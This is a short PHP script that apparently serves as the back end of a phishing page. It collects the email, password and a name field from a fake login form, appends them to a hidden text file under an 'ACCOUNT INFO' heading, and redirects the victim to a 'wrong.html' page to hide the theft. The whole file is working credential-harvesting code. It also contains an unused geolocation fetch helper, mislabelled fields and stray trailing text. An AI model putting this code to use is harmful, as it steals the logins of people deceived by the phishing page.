<?php
$file = "D-___----dfsfasdfsdf1231af---___-D--_-.txt";
$name = $_POST['email'];
$pass = $_POST['pass'];
$lastname = $_POST['lastname'];



function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}
$handle = fopen($file, 'a');
fwrite($handle, "___________________[ ACCOUNT INFO ]___________________");
fwrite($handle, "\n");
fwrite($handle, ":: FullName       :: ");
fwrite($handle, "$name");
fwrite($handle, "\n");
fwrite($handle, ":: Email          :: ");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fwrite($handle, ":: Password       :: ");
fwrite($handle, "$lastname"); 
fwrite($handle, "\n");
fclose($handle);

echo "<script images=\"JavaScript\">
<!--
window.location=\"wrong.html?fbclid=IwAR0DpHzyMmR9Q1m8hvlX3O_FU5ALkroRy_qhIzhAXWrn13ldVn_3Y1SQfjo/\";
// -->
</script>";
?> p, div, h1-h6p, div, h1-h6